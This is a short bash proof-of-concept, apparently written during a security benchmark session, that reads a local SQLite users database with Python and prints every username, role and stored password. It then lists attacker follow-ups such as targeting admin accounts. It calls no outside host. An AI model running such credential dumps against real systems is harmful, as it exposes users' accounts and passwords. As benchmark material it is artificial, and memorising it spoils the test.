#!/bin/bash
# POC: Demonstrates user enumeration through SQLite database analysis by querying the users table directly using Python to reveal all valid usernames, roles, and passwords.
# Target: ./repo
# Created: 2025-12-01T15:49:22.644Z
# Session: benchmark-XBEN-089-24-minbd498

# User Enumeration via Database Analysis POC (Version 2)
# This script demonstrates user enumeration by accessing the SQLite database
# using Python's sqlite3 module instead of the sqlite3 CLI tool

echo "=== User Enumeration via Database Analysis POC ==="
echo ""

# Define the database path
DB_PATH="/home/daytona/repo/XBEN-089-24/app/users.db"

# Check if database file exists
if [ ! -f "$DB_PATH" ]; then
    echo "[!] Database file not found at: $DB_PATH"
    exit 1
fi

echo "[+] Database file found at: $DB_PATH"
echo "[+] File size: $(stat -c%s "$DB_PATH" 2>/dev/null || stat -f%z "$DB_PATH" 2>/dev/null) bytes"
echo ""

echo "=== Querying users table using Python ==="
echo ""

# Use Python to query the database and extract user information
python3 << 'PYTHON_EOF'
import sqlite3
import sys

db_path = "/home/daytona/repo/XBEN-089-24/app/users.db"

try:
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # Query the users table
    cursor.execute("SELECT username, role, password FROM users")
    users = cursor.fetchall()
    
    if users:
        print("[+] SUCCESS: User enumeration successful!")
        print("[+] Found {} user(s) in the database".format(len(users)))
        print("")
        print("=== Enumerated Users ===")
        print("")
        print("{:<15} {:<15} {:<20}".format("Username", "Role", "Password Hash"))
        print("-" * 50)
        
        for user in users:
            username, role, password = user
            print("{:<15} {:<15} {:<20}".format(username, role, password))
        
        print("")
        print("[+] Complete user information extracted from database!")
        print("")
        print("=== Impact Analysis ===")
        print("[!] An attacker can now:")
        print("    1. Identify all valid user accounts (bypassing error-based enumeration)")
        print("    2. Determine which accounts have admin privileges")
        print("    3. See plaintext passwords stored in the database")
        print("    4. Focus brute force attacks on known admin accounts")
        print("    5. Plan targeted social engineering attacks against admins")
        print("")
        sys.exit(0)
    else:
        print("[!] No users found in database")
        sys.exit(1)
        
except sqlite3.Error as e:
    print("[!] Database error: {}".format(e))
    sys.exit(1)
except Exception as e:
    print("[!] Error: {}".format(e))
    sys.exit(1)
PYTHON_EOF

exit $?